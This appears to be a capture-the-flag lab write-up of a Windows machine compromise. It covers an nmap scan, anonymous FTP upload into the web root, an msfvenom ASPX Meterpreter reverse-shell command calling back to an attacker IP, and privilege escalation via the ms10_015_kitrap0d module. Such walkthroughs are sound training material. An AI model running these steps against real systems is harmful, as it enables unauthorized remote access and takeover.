## Reconnaissance

The engagement began with a full TCP port scan to identify the exposed services and protocols on the target.

```bash
nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN devel_scan 10.10.10.5
```

The scan shows an FTP service on port 21 and an HTTP service on port 80.

![FTP and HTTP discovered](/assets/images/devel/125-1.png)
*FTP on port 21 and HTTP on port 80*

## Enumeration / Analysis

The FTP service allows anonymous authentication, so it can be accessed without credentials.

![Anonymous FTP enabled](/assets/images/devel/125-2.png)
*Anonymous login accepted by the FTP service*

Once connected, the server accepts uploads via the PUT command. Since the FTP root is also served by the web server, this is an arbitrary file upload that can be abused to drop a payload that the web service will execute.

## Exploitation

A reverse-shell payload is generated with msfvenom in ASPX format so the web server can run it.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your attacker tun0 IP4> LPORT=6969 -f aspx > payload.aspx
```

The payload is uploaded over FTP and then triggered through the web service, which returns a reverse shell.

![Payload uploaded and executed](/assets/images/devel/125-3.png)
*The ASPX payload executed through the web service*

## Privilege Escalation

From the initial Meterpreter session, msfconsole is used to enumerate local privilege-escalation options, and the suggestion module returns a list of applicable exploits.

![Local exploit suggestions](/assets/images/devel/125-4.png)
*Local exploit suggester output*

A suitable module is picked from the list.

![Exploit selected](/assets/images/devel/125-5.png)
*Selecting a candidate escalation module*

The chosen module is:

```bash
exploit/windows/local/ms10_015_kitrap0d
```

Running it grants administrative access and completes the compromise.

![Administrative access obtained](/assets/images/devel/125-6.png)
*Session elevated to administrator*
